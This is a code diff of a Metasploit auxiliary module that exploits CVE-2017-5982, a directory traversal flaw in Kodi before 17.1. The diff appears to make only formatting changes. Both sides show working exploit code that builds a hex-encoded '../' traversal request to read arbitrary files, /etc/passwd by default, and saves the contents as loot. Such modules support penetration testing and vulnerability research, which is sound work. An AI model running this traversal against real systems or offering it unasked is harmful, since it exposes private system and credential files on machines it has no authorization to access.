@@ -9,32 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Kodi 17.0 Local File Inclusion Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal flaw found in Kodi before 17.1.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Kodi 17.0 Local File Inclusion Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal flaw found in Kodi before 17.1.
+        },
+        'References' => [
           ['CVE', '2017-5982'],
         ],
-      'Author'         =>
-        [
-          'Eric Flokstra',  #Original
+        'Author' => [
+          'Eric Flokstra',  # Original
           'jvoisin'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2017-02-12'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2017-02-12'
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
-        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
-        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ])
+        OptString.new('FILE', [true, 'The file to obtain', '/etc/passwd']),
+        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
+      ]
+    )
   end
-
 
   def run_host(ip)
     base = normalize_uri(target_uri.path)
@@ -45,21 +46,21 @@ class MetasploitModule < Msf::Auxiliary
 
     traverse = '../' * datastore['DEPTH']
     f = datastore['FILE']
-    f = f[1, f.length] if f =~ /^\//
-    f = "image/image://" + Rex::Text.uri_encode(traverse + f, "hex-all")
+    f = f[1, f.length] if f =~ %r{^/}
+    f = 'image/image://' + Rex::Text.uri_encode(traverse + f, 'hex-all')
 
-    uri = normalize_uri(base, Rex::Text.uri_encode(f, "hex-all"))
+    uri = normalize_uri(base, Rex::Text.uri_encode(f, 'hex-all'))
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri
+      'uri' => uri
     })
 
-    if res and res.code != 200
+    if res && (res.code != 200)
       print_error("Unable to read '#{datastore['FILE']}', possibily because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
 
-    elsif res and res.code == 200
+    elsif res && (res.code == 200)
       data = res.body.lstrip
       fname = datastore['FILE']
       p = store_loot(
